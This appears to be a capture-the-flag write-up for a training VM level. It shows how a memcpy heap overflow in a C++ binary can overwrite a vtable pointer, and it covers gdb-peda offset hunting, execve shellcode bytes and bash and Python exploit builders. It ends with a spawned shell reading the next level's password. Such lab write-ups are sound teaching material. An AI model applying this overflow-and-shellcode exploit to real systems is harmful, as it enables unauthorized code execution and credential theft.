# Level9 - Read asm of CPP file

## Local script usage

```shell
Usage: ./Ressources/main.sh
```

## Passwords and token

|        |                                                                    |
| ------ | ------------------------------------------------------------------ |
| level9 | `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a` |
| bonus0 | `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728` |

## Steps to resolve on VM

Note: We will use `gdb-peda`. You can setup peda with the script: [scripts/installPeda.sh](../../scripts/installPeda.sh)

Execute level9

```shell
./level9
```

Nothing happened

Lets debug the binary

```shell
(gdb) info functions
0x080485f4  main
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
```

See our assembly interpretation in [source file](../source.c)

The main difficulty here is the C++ language, that translates class method in not obvious ASM names. For example `_ZN1NplERS_` => `N::operator+(N&)`.

We can see a function `N::setAnnotation(char*)`, that uses `memcpy` and then the register `edx` is executed.

The idea is to use `memcpy` to create a buffer overflow and then execute a shellcode.

Lets search the offset

```shell
gdb-peda$ pset arg cyclic_pattern(200)
gdb-peda$ run
gdb-peda$ pattern search
> Registers contain pattern buffer:
  EAX+0 found at offset: 108
  Pattern buffer found at:
  0x0804a00c : offset    0 - size  200 ([heap])
```

While debugging we confirm the address of the buffer `a->annotation` is well 0x0804a00c, with an offset of 108.

```shell
gdb-peda$ b*0x08048677
gdb-peda$ run AAAA
gdb-peda$ ni
gdb-peda$ x/30x 0x0804a00c
  0x804a00c:      0x41414141      0x00000000      0x00000000      0x00000000
  0x804a01c:      0x00000000      0x00000000      0x00000000      0x00000000
  0x804a02c:      0x00000000      0x00000000      0x00000000      0x00000000
  0x804a03c:      0x00000000      0x00000000      0x00000000      0x00000000
  0x804a04c:      0x00000000      0x00000000      0x00000000      0x00000000
  0x804a05c:      0x00000000      0x00000000      0x00000000      0x00000000
  0x804a06c:      0x00000000      0x00000005      0x00000071      0x08048848
  0x804a07c:      0x00000000      0x00000000
gdb-peda$ x/x 0x08048848
  0x8048848 <_ZTV1N+8>:   0x0804873a
gdb-peda$ x/x 0x0804873a
  0x804873a <_ZN1NplERS_>: 0x8be58955

```

We have to erase the address `0x08048848`. It will be executed by `edx`. It contains a reference to a pointer of `N::operator+(N&)` method.

We have to build an exploit with:

```bash
SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" # Length: 28
PADDING=`python -c 'print("A" * 80)'` # OFFSET=108 - SHELLCODE_LENGTH=28
RETADDRESS="\x0c\xa0\x04\x08"

python -c "print('$SHELLCODE_ADDRESS' + '$SHELLCODE' + '$PADDING' + '$RETADDRESS')" > /tmp/exploit9
```

Lets try

```shell
gdb-peda$ b*0x08048693 # before $edx
gdb-peda$ run $(cat /tmp/exploit9)
gdb-peda$ p $edx
  $1 = 0x6850c031
gdb-peda$ ni
  Stopped reason: SIGSEGV
  0x6850c031 in ?? ()
```

Unfortunately, this one does not work because it tries to dereference the address `0x6860c031` instead of executed it.

We have to put the address of shellcode as prefix.

Lets try again

```bash
SHELLCODE_ADDRESS="\x10\xa0\x04\x08" # Buffer address + 4
SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
PADDING=`python -c 'print("A" * 76)'` # OFFSET=108 - SHELLCODE_LENGTH=28 - SHELLCODE_ADDRESS=4
RETADDRESS="\x0c\xa0\x04\x08" # Buffer address

python -c "print('$SHELLCODE_ADDRESS' + '$SHELLCODE' + '$PADDING' + '$RETADDRESS')" > /tmp/exploit9
```

```shell
gdb-peda$ b*0x08048693 # before $edx
gdb-peda$ run $(cat /tmp/exploit9)
gdb-peda$ p $edx
  $1 = 0x804a010 # address of shellcode
gdb-peda$ x/x 0x804a010
  0x804a010:      0x6850c031 # first instructions of shellcode. Seems great !
gdb-peda$ continue
  process 9431 is executing new program: /bin/dash
$ # We have got the shell !
```

Another way could be to fill the padding with NOPSLED (\x90) and then point to an address inside this padding of NOP  
The buffer starting at 0x0804a00c with 76 NOP (108 - 28 - 4), we can for example chose 16 bytes after and point at 0x0804a01c

```python
#!/usr/bin/python

START = '\x1c\xa0\x04\x08'
NOPSLED = '\x90' * (108 - 28 - 4)
SHELLCODE = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
EIP = '\x0c\xa0\x04\x08'

print START + NOPSLED + SHELLCODE + EIP
```

Finally we can get the pass !

```shell
~/level9 $(cat /tmp/exploit9)
$ whoami
> bonus0
$ cat /home/user/bonus0/.pass
> f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

---

## Sources

### ASM

- [What is operator new(unsigned int)? - \_Znwj](https://reverseengineering.stackexchange.com/questions/4402/what-is-operator-newunsigned-int)

### CPP

- [C++ Overloading (Operator and Function)](https://www.tutorialspoint.com/cplusplus/cpp_overloading.htm)
- [Man \_Exit](https://en.cppreference.com/w/cpp/utility/program/_Exit)
- [Man memcpy](http://www.cplusplus.com/reference/cstring/memcpy/)
